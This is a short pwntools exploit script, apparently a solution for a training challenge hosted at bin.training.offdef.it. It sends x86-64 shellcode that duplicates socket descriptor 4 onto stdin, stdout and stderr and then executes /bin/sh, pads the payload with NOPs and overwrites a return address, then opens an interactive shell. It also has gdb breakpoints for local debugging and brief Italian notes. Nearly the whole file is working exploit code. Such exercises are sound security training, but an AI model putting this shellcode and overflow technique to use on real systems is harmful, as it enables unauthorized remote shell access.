from pwn import *
import time
context.update(arch='amd64', os='linux')
context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    p = process("./server")
    gdb.attach(p, """
        #b *0x00401521
        #b *0x004014b8 
        b *0x00401428      
        c
        """)
    input("wait")
else:
    p = remote("bin.training.offdef.it", 2005)

payload="""
xor rax, rax
mov rax, 0x21	
mov rsi, 0x0   # new
mov rdi, 0x4   # old
syscall
xor rax, rax
mov rax, 0x21	
mov rsi, 0x1
mov rdi, 0x4
syscall
xor rax, rax
mov rax, 0x21	
mov rsi, 0x2
mov rdi, 0x4
syscall
"""

shell="""
xor rsi, rsi
xor rdi, rdi
xor rdx, rdx
xor rax, rax
mov rax, 0x3b
mov rbx, 0x0068732f6e69622f
push rbx
mov rdi, rsp
syscall
"""

a=asm(payload)+asm(shell)

p.send(a.ljust(1016, b'\x90')+p64(0x4040e0))
p.interactive()

#################   pkill server

lvar2=-8
puvar3=0x4040e8
puvar4=0x4040e8
uvar1=511 #decimale fino a 0
#incrementa puvar3 e puvar4 fino a 0x4042e7


# ps aux | grep server